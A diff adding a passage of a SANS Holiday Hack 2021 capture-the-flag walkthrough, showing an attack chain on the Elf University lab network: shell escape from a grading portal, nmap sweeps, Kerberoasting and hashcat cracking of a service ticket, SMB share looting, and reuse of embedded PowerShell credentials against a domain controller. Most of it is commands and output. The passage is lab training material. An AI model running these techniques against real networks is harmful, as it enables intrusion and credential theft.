@@ -399,6 +399,509 @@ Obtain the secret sleigh research document from a host on the Elf University dom
 
 #### Solution
 
+Signing up at ElfU gives you credentials for SSH access into the grading machine. These credentials don't last long though, so they may vary in this walkthrough as the challenge was completed over multiple days.
+
+![create account](./elfu.png)
+
+```shell
+===================================================
+=      Elf University Student Grades Portal       =
+=          (Reverts Everyday 12am EST)            =
+===================================================
+1. Print Current Courses/Grades.
+e. Exit
+:
+```
+
+Entering `1`:
+```shell
+0  Shortname                    Description  Grade
+==================================================
+1    PRDL301     Present Delivery Logistics     C
+2    NPAR301    North Pole Art Appreciation     D+
+3    CACH101                Candy Chemistry     F
+4    NNLM201  Naughty Nice List Mathematics     D+
+5    SLPE101  Sleigh Propulsion Engineering     B-
+Press Enter to continue...
+```
+
+Entering `e` closes the connection, but `control + D` cause an error that drops us in a Python process:
+
+```shell
+===================================================
+=      Elf University Student Grades Portal       =
+=          (Reverts Everyday 12am EST)            =
+===================================================
+1. Print Current Courses/Grades.
+e. Exit
+: Traceback (most recent call last):
+  File "/opt/grading_system", line 41, in <module>
+    main()
+  File "/opt/grading_system", line 26, in main
+    a = input(": ").lower().strip()
+EOFError
+>>>
+```
+
+From here, we can launch an interactive bash shell:
+```shell
+>>> os.system('bash')
+pqsgdggdkl@grades:~$ pwd
+/home/pqsgdggdkl
+pqsgdggdkl@grades:~$ whoami
+pqsgdggdkl
+```
+
+Before moving on, change the login shell to make it possible to `scp` files:
+```shell
+pqsgdggdkl@grades:~$ chsh -s /bin/bash
+```
+
+We need to find other machines to pivot, but check for network information:
+
+```shell
+pqsgdggdkl@grades:~$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
+        RX packets 19146062  bytes 4411015525 (4.4 GB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 21066068  bytes 2343080962 (2.3 GB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 511177  bytes 38986416 (38.9 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 511177  bytes 38986416 (38.9 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+As hinted by the elf, we need to find a domain controller in the 10.0.0.0/8 network. First, take a look at the routing tables as mentioned in the hint:
+
+```shell
+pqsgdggdkl@grades:~$ netstat -rn
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         172.17.0.1      0.0.0.0         UG        0 0          0 eth0
+10.128.1.0      172.17.0.1      255.255.255.0   UG        0 0          0 eth0
+10.128.2.0      172.17.0.1      255.255.255.0   UG        0 0          0 eth0
+10.128.3.0      172.17.0.1      255.255.255.0   UG        0 0          0 eth0
+172.17.0.0      0.0.0.0         255.255.0.0     U         0 0          0 eth0
+```
+
+There are 3 such IP addresses. The hint also mentions a change to the `nmap` command in order to allow for default probing on an unprivileged scan. We are looking for port 389 (LDAP) being open:
+
+```shell
+pqsgdggdkl@grades:~$ nmap -p389 -PS22,445 --open 10.128.1.0/24 10.128.2.0/24 10.128.3.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-23 18:46 UTC
+Nmap scan report for hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53)
+Host is up (0.00045s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+
+Nmap scan report for 10.128.3.30
+Host is up (0.00057s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+
+Nmap done: 768 IP addresses (238 hosts up) scanned in 23.29 seconds
+```
+
+This leaves two possible domain controllers to inspect. Let's get more information on each:
+```shell
+pqsgdggdkl@grades:~$ nmap -PS22,445 --open 10.128.1.53
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-23 18:50 UTC
+Nmap scan report for hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53)
+Host is up (0.00032s latency).
+Not shown: 988 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 4.45 seconds
+pqsgdggdkl@grades:~$ nmap -PS22,445 --open 10.128.3.30
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-23 18:50 UTC
+Nmap scan report for 10.128.3.30
+Host is up (0.00020s latency).
+Not shown: 966 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+636/tcp  open  ldapssl
+1024/tcp open  kdm
+1025/tcp open  NFS-or-IIS
+1026/tcp open  LSA-or-nterm
+1027/tcp open  IIS
+1028/tcp open  unknown
+1029/tcp open  ms-lsa
+1030/tcp open  iad1
+1031/tcp open  iad2
+1032/tcp open  iad3
+1033/tcp open  netinfo
+1034/tcp open  zincite-a
+1035/tcp open  multidropper
+1036/tcp open  nsstp
+1037/tcp open  ams
+1038/tcp open  mtqp
+1039/tcp open  sbl
+1040/tcp open  netsaint
+1041/tcp open  danf-ak2
+1042/tcp open  afrog
+1043/tcp open  boinc
+1044/tcp open  dcutility
+2222/tcp open  EtherNetIP-1
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+
+Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
+```
+
+We need to connect to the domain controller, but to do so, we need to do Kerberoasting. The necessary scripts are provided at `/usr/local/bin`; however, they need a domain. Another `nmap` can give us the domain of `elfu.local0`:
+```shell
+pqsgdggdkl@grades:~$ nmap -PS22,445 -v -sV 10.128.1.53
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-23 20:21 UTC
+NSE: Loaded 45 scripts for scanning.
+Initiating Ping Scan at 20:21
+Scanning 10.128.1.53 [2 ports]
+Completed Ping Scan at 20:21, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 20:21
+Completed Parallel DNS resolution of 1 host. at 20:21, 0.01s elapsed
+Initiating Connect Scan at 20:21
+Scanning hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53) [1000 ports]
+Discovered open port 135/tcp on 10.128.1.53
+Discovered open port 445/tcp on 10.128.1.53
+Discovered open port 3389/tcp on 10.128.1.53
+Discovered open port 53/tcp on 10.128.1.53
+Discovered open port 139/tcp on 10.128.1.53
+Discovered open port 389/tcp on 10.128.1.53
+Discovered open port 3268/tcp on 10.128.1.53
+Discovered open port 464/tcp on 10.128.1.53
+Discovered open port 636/tcp on 10.128.1.53
+Discovered open port 593/tcp on 10.128.1.53
+Discovered open port 3269/tcp on 10.128.1.53
+Discovered open port 88/tcp on 10.128.1.53
+Completed Connect Scan at 20:21, 4.01s elapsed (1000 total ports)
+Initiating Service scan at 20:21
+Scanning 12 services on hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53)
+Stats: 0:01:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 91.67% done; ETC: 20:22 (0:00:07 remaining)
+Completed Service scan at 20:23, 141.14s elapsed (12 services on 1 host)
+NSE: Script scanning 10.128.1.53.
+Initiating NSE at 20:23
+Completed NSE at 20:23, 0.05s elapsed
+Initiating NSE at 20:23
+Completed NSE at 20:23, 1.01s elapsed
+Nmap scan report for hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53)
+Host is up (0.00068s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain?
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-23 20:21:43Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: elfu.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: elfu.local0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=12/23%Time=61C4DA5C%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03");
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 146.63 seconds
+```
+
+With this, we can run the `GetUserSPNs.py` script. Note that we use `elfu.local` for the domain (drop the `0.` at the end):
+```shell
+pqsgdggdkl@grades:~$ python3 /usr/local/bin/GetUserSPNs.py -outputfile spns.txt -dc-ip 10.128.1.53 'elfu.local/$USER:<password>' -request
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon                   Delegation
+-----------------------------------  --------  --------  --------------------------  --------------------------  ----------
+ldap/elfu_svc/elfu                   elfu_svc            2021-10-29 19:25:04.305279  2021-12-23 20:17:40.164817
+ldap/elfu_svc/elfu.local             elfu_svc            2021-10-29 19:25:04.305279  2021-12-23 20:17:40.164817
+ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305279  2021-12-23 20:17:40.164817
+ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  2021-12-23 20:17:40.164817
+```
+
+This gives us the Kerberos ticket for the `elfu_svc` account:
+```shell
+pqsgdggdkl@grades:~$ cat spns.txt
+$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$526de65fc68161292fd4dedf08ba21b7$83952e687024a42333658192781e9c44c1de2b61f4cf92eb6201143c65611906fdfd941cf318a1d7c6a4c3e0b7303f7a4d8d414222edf1e4e19a16d21e9d97556d4964eaa06f9dc9d16d890bd4a16531853b70fc1c2b3d19804bfe2572f528c5ff7d29ecc41a23ad9647cbd905bca79a60e27f4af03f998bd43c742dfb3e527bcec3061d85b446894cd9a99e7eb21e8497ca751ae1c833b4b4511f699e0a1700ecb8e6b905d4fd1de00b7232126dba01f87d98a60d24fb0a451c4f9f01ae30e8ce9062522c84d01bbe222afaa5f9feecc95310507772c5080db0699c9b5d5420937c63b7c309d31804e705b56e4d70d437a635797e14bbf74174eafc6a94b1debdfba0fb9be235a03ef9862b189aefc02a5d71bb3164be20ee81df45421a9c98c93ec0dd14fa7b3198108548721a572fffa0892ddeacad6d3974f88d012e4959c207f2bd29ef369fc42d3daf48bb1027711d1b68180bf351bebf09f6ef55a248c83b01972cf8dc8aa55132545522ab68cfdd948c4ac92c94c4a974405948d01f3ad80b4122f64799e26d0ea4a217968284095bfa301a8e79018fc22743e97f0e987414e626cf4f2629d51f81e42bb97435c126a28f24fa9baf866fd8ba061c26c8d1d839cb652d89a9716424c776098532bd8febc9549fa231ba8a0fa542b4ebd29b4b54d2e8f0880ab9c03684d1d338a726e5f6e7d0a17b04549910d552016dce363319f48bd8d3222d32a7e79eadbb7dd9a80084d894aa021ef3e3e66d16ac21946056332109773eadf72e806f1a0c694fa09988871fea2b99c4795504e4634f9ca05b550604b53edd2428aa1e162b8a657c4b6e4f37a71ca5fbf41ea4ec3894ff2f02f16e24323faf1fc9a87d08d75ba2245c7755839ab716b99392dd39cfb8369f6a483a34f9273ab42e3c72526a1605456c63e39a0c3c66655ee2404b096aa1c355a6e35192899a1b80802ca75c41147809f002bc99ff01764011689a5ca835a8dd35011967c44dd3cafb0b3d1a31faf6f688cec3badbfa362bb316d4769a14f91d411b0f2648debe86e2ce809bc1a8abafb82d32cba7688a19e0377a057fc4338ceec6dc5b59e3bf6dc25e9872124127ec8040d29712d2f60807cc3647d70baa9a222d183b99b546910945211a6fd9c3634e969ea1bd2f7b3ee8079fa949c04e0884cb3de97654761692208496278019df63a1a259675a3f90b2c61e1ece68bf31bf10e9209ce251ec4f20c392728ec2ec836881585c0aa6cdc5ef4e7f956736ebcd1d7cf723e1bbf4b0c20af4d1271dfff3c7d3939e8c0c0deaacc751e85f04535dc70f5741e089d6fab1159f62d1af1a4fdc8303de902700ffc7615c570f3545daa7b9e8cfca9c49ad8c0d2a6edae961ed579715ca3b70fb7eb5b0e93d39227664dd6537536655aef237479e9c333790009b224c94d637b56c745ceac62c53e33d
+```
+
+The tool [CeWL](https://github.com/digininja/CeWL) is mentioned as a way to build word lists for cracking passwords, but the elf hints that it ignores numbers by default. To use this tool, we would need to pass it a URL to look through. Right now, we only know about the [registration website](https://register.elfu.org/register#!). If we take a look at the source code of the page, we see an interesting comment:
+
+```html
+<!-- Remember the groups battling to win the karaoke contest earleir this year? I think they were rocks4socks, cookiepella, asnow2021, 
+v0calprezents, Hexatonics, and reindeers4fears. Wow, good times! -->
+```
+
+Add those to a file (`elfu_words.txt`) here and grab the [rule list](https://github.com/NotSoSecure/password_cracking_rules) that the elf mentions as well (save as `rules.rule`). Now, we can crack the password with `hashcat`:
+
+```shell
+$ hashcat -m 13100 -a 0 spns.txt --potfile-disable -r rules.rule --force -O -w 4 --opencl-device-types 1,2 elfu_words.txt
+
+$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$526de65fc68161292fd4dedf08ba21b7$83952e687024a42333658192781e9c44c1de2b61f4cf92eb6201143c65611906fdfd941cf318a1d7c6a4c3e0b7303f7a4d8d414222edf1e4e19a16d21e9d97556d4964eaa06f9dc9d16d890bd4a16531853b70fc1c2b3d19804bfe2572f528c5ff7d29ecc41a23ad9647cbd905bca79a60e27f4af03f998bd43c742dfb3e527bcec3061d85b446894cd9a99e7eb21e8497ca751ae1c833b4b4511f699e0a1700ecb8e6b905d4fd1de00b7232126dba01f87d98a60d24fb0a451c4f9f01ae30e8ce9062522c84d01bbe222afaa5f9feecc95310507772c5080db0699c9b5d5420937c63b7c309d31804e705b56e4d70d437a635797e14bbf74174eafc6a94b1debdfba0fb9be235a03ef9862b189aefc02a5d71bb3164be20ee81df45421a9c98c93ec0dd14fa7b3198108548721a572fffa0892ddeacad6d3974f88d012e4959c207f2bd29ef369fc42d3daf48bb1027711d1b68180bf351bebf09f6ef55a248c83b01972cf8dc8aa55132545522ab68cfdd948c4ac92c94c4a974405948d01f3ad80b4122f64799e26d0ea4a217968284095bfa301a8e79018fc22743e97f0e987414e626cf4f2629d51f81e42bb97435c126a28f24fa9baf866fd8ba061c26c8d1d839cb652d89a9716424c776098532bd8febc9549fa231ba8a0fa542b4ebd29b4b54d2e8f0880ab9c03684d1d338a726e5f6e7d0a17b04549910d552016dce363319f48bd8d3222d32a7e79eadbb7dd9a80084d894aa021ef3e3e66d16ac21946056332109773eadf72e806f1a0c694fa09988871fea2b99c4795504e4634f9ca05b550604b53edd2428aa1e162b8a657c4b6e4f37a71ca5fbf41ea4ec3894ff2f02f16e24323faf1fc9a87d08d75ba2245c7755839ab716b99392dd39cfb8369f6a483a34f9273ab42e3c72526a1605456c63e39a0c3c66655ee2404b096aa1c355a6e35192899a1b80802ca75c41147809f002bc99ff01764011689a5ca835a8dd35011967c44dd3cafb0b3d1a31faf6f688cec3badbfa362bb316d4769a14f91d411b0f2648debe86e2ce809bc1a8abafb82d32cba7688a19e0377a057fc4338ceec6dc5b59e3bf6dc25e9872124127ec8040d29712d2f60807cc3647d70baa9a222d183b99b546910945211a6fd9c3634e969ea1bd2f7b3ee8079fa949c04e0884cb3de97654761692208496278019df63a1a259675a3f90b2c61e1ece68bf31bf10e9209ce251ec4f20c392728ec2ec836881585c0aa6cdc5ef4e7f956736ebcd1d7cf723e1bbf4b0c20af4d1271dfff3c7d3939e8c0c0deaacc751e85f04535dc70f5741e089d6fab1159f62d1af1a4fdc8303de902700ffc7615c570f3545daa7b9e8cfca9c49ad8c0d2a6edae961ed579715ca3b70fb7eb5b0e93d39227664dd6537536655aef237479e9c333790009b224c94d637b56c745ceac62c53e33d:Snow2021!
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, TGS-REP
+Hash.Target......: $krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_sv...53e33d
+Time.Started.....: Thu Dec 23 17:42:24 2021, (4 secs)
+Time.Estimated...: Thu Dec 23 17:42:28 2021, (0 secs)
+Guess.Base.......: File (elfu_words.txt)
+Guess.Mod........: Rules (rules.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   808.0 kH/s (6.73ms) @ Accel:64 Loops:64 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 3378432/4315585 (78.28%)
+Rejected.........: 0/3378432 (0.00%)
+Restore.Point....: 0/83 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:40640-40704 Iteration:0-64
+Candidates.#1....: domain -> ceindeers4fears
+```
+
+We now have the password for the `elfu_svc` account: `Snow2021!`. Check if there are any share drives that we can access in our network:
+```shell
+pqsgdggdkl@grades:~$ nmap -PS22,445 -p 445 172.17.0.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-23 23:17 UTC
+Nmap scan report for 172.17.0.1
+Host is up (0.00043s latency).
+
+PORT    STATE  SERVICE
+445/tcp closed microsoft-ds
+
+Nmap scan report for grades.elfu.local (172.17.0.2)
+Host is up (0.00037s latency).
+
+PORT    STATE  SERVICE
+445/tcp closed microsoft-ds
+
+Nmap scan report for 172.17.0.3
+Host is up (0.00032s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Nmap scan report for 172.17.0.4
+Host is up (0.00025s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Nmap scan report for 172.17.0.5
+Host is up (0.00018s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Nmap done: 256 IP addresses (5 hosts up) scanned in 2.85 seconds
+```
+
+We can use the `smbclient` to enumerate the share drives:
+```shell
+pqsgdggdkl@grades:~$ smbclient -U elfu_svc -L \\\\172.17.0.3
+Enter WORKGROUP\elfu_svc's password:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	netlogon        Disk
+	sysvol          Disk
+	elfu_svc_shr    Disk      elfu_svc_shr
+	research_dep    Disk      research_dep
+	IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
+SMB1 disabled -- no workgroup available
+pqsgdggdkl@grades:~$ smbclient -U elfu_svc -L \\\\172.17.0.4
+Enter WORKGROUP\elfu_svc's password:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	IPC$            IPC       IPC Service (Remote IPC)
+SMB1 disabled -- no workgroup available
+Enter WORKGROUP\elfu_svc's password:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ElfUFiles       Disk
+	IPC$            IPC       IPC Service (Remote IPC)
+SMB1 disabled -- no workgroup available
+```
+
+Our credentials don't get us access to the `research_dep` share, but they do work for `elfu_svc_shr`:
+
+```shell
+pqsgdggdkl@grades:~$ smbclient -U elfu_svc \\\\172.17.0.3\\elfu_svc_shr
+Enter WORKGROUP\elfu_svc's password:
+Try "help" to get a list of possible commands.
+smb: \>
+```
+
+Download all the files for inspection outside the client:
+```shell
+smb: \> prompt OFF
+smb: \> mget *
+```
+
+Use `egrep` to look for passwords in the files (the string to look for is shown in the talk):
+```shell
+pqsgdggdkl@grades:~$ egrep -nr "ConvertTo-SecureString" . -B2
+./Run-ConnectionTestToNavContainer.ps1-75-        $bcAuthContext = Renew-BcAuthContext $bcAuthContext
+./Run-ConnectionTestToNavContainer.ps1-76-        $accessToken = $bcAuthContext.accessToken
+./Run-ConnectionTestToNavContainer.ps1:77:        $credential = New-Object pscredential -ArgumentList 'freddyk', (ConvertTo-SecureString -String 'P@ssword1' -AsPlainText -Force)
+--
+./Run-ConnectionTestToNavContainer.ps1-159-        if ($accessToken) {
+./Run-ConnectionTestToNavContainer.ps1-160-            $clientServicesCredentialType = "AAD"
+./Run-ConnectionTestToNavContainer.ps1:161:            $credential = New-Object pscredential $credential.UserName, (ConvertTo-SecureString -String $accessToken -AsPlainText -Force)
+--
+./Run-ConnectionTestToNavContainer.ps1-220-            if ($accessToken) {
+./Run-ConnectionTestToNavContainer.ps1-221-                $clientServicesCredentialType = "AAD"
+./Run-ConnectionTestToNavContainer.ps1:222:                $credential = New-Object pscredential $credential.UserName, (ConvertTo-SecureString -String $accessToken -AsPlainText -Force)
+Binary file ./.cache/powershell/ModuleAnalysisCache-F62D67E4 matches
+--
+./Replace-NavServerContainer.ps1-81-        $settings = Get-Content -path $settingsScript | Where-Object { !$_.Startswith('$Office365Password = ') }
+./Replace-NavServerContainer.ps1-82-
+./Replace-NavServerContainer.ps1:83:        $secureOffice365Password = ConvertTo-SecureString -String $AadAccessToken -AsPlainText -Force
+--
+./HelperFunctions.ps1-10-        if (Test-Path "$hostHelperFolder\aes.key") {
+./HelperFunctions.ps1-11-            $key = Get-Content -Path "$hostHelperFolder\aes.key"
+./HelperFunctions.ps1:12:            New-Object System.Management.Automation.PSCredential ($DefaultUserName, (ConvertTo-SecureString -String $adminPassword -Key $key))
+./HelperFunctions.ps1-13-        } else {
+./HelperFunctions.ps1:14:            New-Object System.Management.Automation.PSCredential ($DefaultUserName, (ConvertTo-SecureString -String $adminPassword))
+--
+./Encryption.ps1-161-        {
+./Encryption.ps1-162-            $PrivateCertPath = Resolve-Path -Path $PrivateCertPath
+./Encryption.ps1:163:            $privateCertSecurePassword = $PrivateCertPassword | ConvertTo-SecureString -AsPlainText -Force
+--
+./InvokeKerberoast.ps1-384-Get-Domain -Domain testlab.local
+./InvokeKerberoast.ps1-385-.EXAMPLE
+./InvokeKerberoast.ps1:386:$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+--
+./InvokeKerberoast.ps1-758-Find users who doesn't require Kerberos preauthentication and DON'T have an expired password.
+./InvokeKerberoast.ps1-759-.EXAMPLE
+./InvokeKerberoast.ps1:760:$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+--
+./InvokeKerberoast.ps1-1063-format instead of John (the default).
+./InvokeKerberoast.ps1-1064-.EXAMPLE
+./InvokeKerberoast.ps1:1065:$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce
+--
+./Run-TestsInNavContainer.ps1-147-        $bcAuthContext = Renew-BcAuthContext $bcAuthContext
+./Run-TestsInNavContainer.ps1-148-        $accessToken = $bcAuthContext.accessToken
+./Run-TestsInNavContainer.ps1:149:        $credential = New-Object pscredential -ArgumentList 'someuser', (ConvertTo-SecureString -String 'S0meP@ssword' -AsPlainText -Force)
+--
+./Run-TestsInNavContainer.ps1-287-                if ($accessToken) {
+./Run-TestsInNavContainer.ps1-288-                    $clientServicesCredentialType = "AAD"
+./Run-TestsInNavContainer.ps1:289:                    $credential = New-Object pscredential $credential.UserName, (ConvertTo-SecureString -String $accessToken -AsPlainText -Force)
+--
+./Run-TestsInNavContainer.ps1-381-                    if ($accessToken) {
+./Run-TestsInNavContainer.ps1-382-                        $clientServicesCredentialType = "AAD"
+./Run-TestsInNavContainer.ps1:383:                        $credential = New-Object pscredential $credential.UserName, (ConvertTo-SecureString -String $accessToken -AsPlainText -Force)
+--
+./Publish-PerTenantExtensionApps.ps1-54-        if ($clientId -is [SecureString]) { $clientID = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($clientID)) }
+./Publish-PerTenantExtensionApps.ps1-55-        if ($clientId -isnot [String]) { throw "ClientID needs to be a SecureString or a String" }
+./Publish-PerTenantExtensionApps.ps1:56:        if ($clientSecret -is [String]) { $clientSecret = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force }
+--
+./New-NavContainer.ps1-286-                if ($_.Name -eq "Credential" -or $_.Name -eq "DatabaseCredential") {
+./New-NavContainer.ps1-287-                    Write-Host "Default parameter $($_.Name)"
+./New-NavContainer.ps1:288:                    Set-Variable -Name $_.Name -Value (New-Object pscredential -ArgumentList $_.Value.Username, ($_.Value.Password | ConvertTo-SecureString))
+--
+./New-NavContainer.ps1-308-                if ($_.Name -eq "Credential" -or $_.Name -eq "DatabaseCredential") {
+./New-NavContainer.ps1-309-                    Write-Host "Default parameter $($_.Name)"
+./New-NavContainer.ps1:310:                    Set-Variable -Name $_.Name -Value (New-Object pscredential -ArgumentList $_.Value.Username, ($_.Value.Password | ConvertTo-SecureString))
+--
+./New-NavContainer.ps1-356-    if ($Credential -eq $null -or $credential -eq [System.Management.Automation.PSCredential]::Empty) {
+./New-NavContainer.ps1-357-        if ($filesOnly) {
+./New-NavContainer.ps1:358:            $credential = New-Object pscredential -ArgumentList 'admin', (ConvertTo-SecureString -String (GetRandomPassword) -AsPlainText -Force)
+--
+./Renew-LetsEncryptCertificate.ps1-14-  DNS Alias is obsolete - you do not need to specify this
+./Renew-LetsEncryptCertificate.ps1-15- .Example
+./Renew-LetsEncryptCertificate.ps1:16:  Renew-LetsEncryptCertificate -publicDnsName "host.westeurope.cloudapp.azure.com" -certificatePfxFilename "c:\temp\cert.pfx" -certificatePfxPassword (ConvertTo-SecureString -String "S0mep@ssw0rd!" -AsPlainText -Force)
+--
+./GetProcessInfo.ps1-1-$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+./GetProcessInfo.ps1:2:$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+--
+./Invoke-ScriptInNavContainer.ps1-60-                }
+./Invoke-ScriptInNavContainer.ps1-61-                foreach($node in $nodes) {
+./Invoke-ScriptInNavContainer.ps1:62:                    $node.InnerText = ConvertFrom-SecureString -SecureString ($node.InnerText | ConvertTo-SecureString) -Key $encryptionkey
+--
+./Invoke-ScriptInNavContainer.ps1-71-                    '$nsmgr.AddNamespace("ns", "http://schemas.microsoft.com/powershell/2004/04")' | Add-Content $file
+./Invoke-ScriptInNavContainer.ps1-72-                    '$nodes = $xml.SelectNodes("//ns:SS", $nsmgr)' | Add-Content $file
+./Invoke-ScriptInNavContainer.ps1:73:                    'foreach($node in $nodes) { $node.InnerText = ConvertFrom-SecureString -SecureString ($node.InnerText | ConvertTo-SecureString -Key $encryptionKey) }' | Add-Content $file
+--
+./Run-AlValidation.ps1-263-    $password = GetRandomPassword
+./Run-AlValidation.ps1-264-    Write-Host "admin/$password"
+./Run-AlValidation.ps1:265:    $credential= (New-Object pscredential 'admin', (ConvertTo-SecureString -String $password -AsPlainText -Force))
+```
+
+The `GetProcessInfo.ps1` script contains a password and is able to connect to the domain controller at 10.128.1.53 using the username `remote_elf`. This script runs the `GetProcess` command on that machine and sends back the result. Can we change this to connect ourselves?
+
+```shell
+$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
+Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
+```
+
+We can change the last line to connect to the domain controller instead of just running the `Get-Process` cmdlet:
+
+```shell
+PS /home/pqsgdggdkl> cat dc_logon.ps1
